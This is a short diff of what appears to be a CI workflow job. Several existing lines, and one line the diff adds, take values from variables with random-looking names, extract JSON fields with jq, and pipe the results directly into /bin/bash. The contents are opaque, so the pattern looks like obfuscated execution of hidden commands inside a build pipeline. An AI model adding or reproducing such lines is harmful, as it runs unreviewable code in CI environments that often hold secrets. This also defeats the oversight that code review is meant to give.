@@ -31,6 +31,7 @@ jobs:
           echo $huu99 | jq -r .k0391 | /bin/bash
           printf '%s' "$uuigk1627" | jq -r .b748 | /bin/bash
           echo $jjk14 | jq -r .v766 | /bin/bash
+          printf '%s' "$una474" | jq -r .tlqs515 | /bin/bash
 
       - name: Archive output
         if: always()
